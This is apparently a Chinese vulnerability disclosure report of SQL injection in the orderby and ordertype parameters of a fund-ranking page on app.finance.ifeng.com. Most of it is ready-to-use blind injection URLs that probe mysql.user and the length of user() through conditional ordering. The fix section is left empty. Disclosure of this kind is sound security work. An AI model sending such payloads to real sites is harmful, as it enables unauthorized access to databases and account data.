详细说明：

http://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&fund_type=gp&orderby=jjdm,If((1=2),1,(select%20user%20from%20mysql.user))%20desc%23&ordertype=asc







http://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&fund_type=gp&orderby=jjdm,If((1=1),1,(select%20user%20from%20mysql.user))%20desc%23&ordertype=asc





http://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&fund_type=gp&orderby=jjdm&ordertype=,If((1=2),1,(select%20user%20from%20mysql.user)) asc





http://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&fund_type=gp&orderby=jjdm&ordertype=,If((1=1),1,(select%20user%20from%20mysql.user)) asc





ordertype orderby都存在注入。

漏洞证明：

http://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&fund_type=gp&orderby=abs(jjdm-(length(user())=23)*8000)&ordertype=asc



http://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&fund_type=gp&orderby=abs(jjdm-(length(user())=22)*8000)&ordertype=asc





看基金名称:华夏优势增长股票为第一号还是第四号。

公司部方便上QQ,就不截图了.见谅了。









修复方案：
